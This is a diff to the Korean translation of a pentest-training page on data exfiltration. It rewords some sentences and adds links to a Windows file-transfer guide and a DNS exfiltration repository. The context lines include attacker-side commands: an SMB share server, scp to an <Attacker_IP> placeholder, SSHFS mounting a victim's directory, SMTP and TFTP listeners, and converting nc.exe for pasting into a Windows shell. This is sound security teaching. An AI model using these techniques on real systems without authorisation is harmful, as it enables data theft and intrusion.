@@ -2,7 +2,7 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 정보를 유출하기 위해 일반적으로 허용된 도메인
+## 정보 유출을 위해 일반적으로 허용된 도메인
 
 [https://lots-project.com/](https://lots-project.com/)를 확인하여 악용될 수 있는 일반적으로 허용된 도메인을 찾으세요.
 
@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-samba를 사용하여 SMB 공유를 생성합니다:
+samba를 사용하여 **smb 공유**를 생성합니다:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -181,7 +181,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-피해자가 SSH를 가지고 있다면, 공격자는 피해자의 디렉토리를 공격자에게 마운트할 수 있습니다.
+희생자가 SSH를 가지고 있다면, 공격자는 희생자의 디렉토리를 공격자에게 마운트할 수 있습니다.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -234,7 +234,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-기본적으로 XP와 2003에서는 (다른 버전에서는 설치 중에 명시적으로 추가해야 함)
+기본적으로 XP와 2003에서 (다른 버전에서는 설치 중에 명시적으로 추가해야 함)
 
 Kali에서, **TFTP 서버 시작**:
 ```bash
@@ -304,6 +304,10 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 그런 다음 텍스트를 윈도우 셸에 복사하여 붙여넣으면 nc.exe라는 파일이 생성됩니다.
 
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
